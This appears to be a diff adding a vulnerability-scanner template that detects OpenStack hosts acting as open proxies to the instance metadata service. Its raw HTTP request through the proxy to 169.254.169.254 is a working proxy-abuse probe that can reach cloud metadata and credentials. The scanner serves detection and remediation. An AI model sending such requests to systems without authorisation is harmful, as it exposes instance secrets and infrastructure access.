@@ -1,0 +1,43 @@
+id: metadata-service-openstack
+
+# This attack abuses a misconfigured proxy that allows access to the metadata
+# IP or a name which resolves to the IP. A standard proxy request is made to
+# the proxy using the full metadata URL, which the proxy will fulfill to its
+# own metadata service.
+# The proxy may also be vulnerable to host/port enumeration on localhost or
+# inside the private network.
+info:
+  name: Openstack Metadata Service Check
+  author: sullo
+  severity: critical
+  description: The Openstack host is configured as a proxy which allows access to the instance metadata service. This could allow significant access to the host/infrastructure.
+  remediation: Disable the proxy or restrict configuration to only allow access to approved hosts/ports. Upgrade to IMDSv2 if possible.
+  reference:
+    - https://docs.openstack.org/nova/latest/admin/metadata-service.html
+    - https://blog.projectdiscovery.io/abusing-reverse-proxies-metadata/
+    - https://www.mcafee.com/blogs/enterprise/cloud-security/how-an-attacker-could-use-instance-metadata-to-breach-your-app-in-aws/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
+    cvss-score: 9.3
+    cwe-id: CWE-441
+  metadata:
+    max-request: 2
+  tags: exposure,config,openstack,proxy,misconfig,metadata
+
+http:
+  - raw:
+      - |+
+        GET http://{{hostval}}/openstack/latest HTTP/1.1
+        Host: {{hostval}}
+
+    payloads:
+      hostval:
+        - aws.oast.online
+        - 169.254.169.254
+    unsafe: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "vendor_data.json"
+# digest: 4a0a00473045022100ed1321dc427c8b6f368f856d3e4ba455c73b7439c6df74d8adf2aae96d33d21f02206204d758db7658f7f367b7355dba3fd43ce9b505c31ae735c8dc15ddf2736cd9:922c64590222798bb761d5b6d8e72950
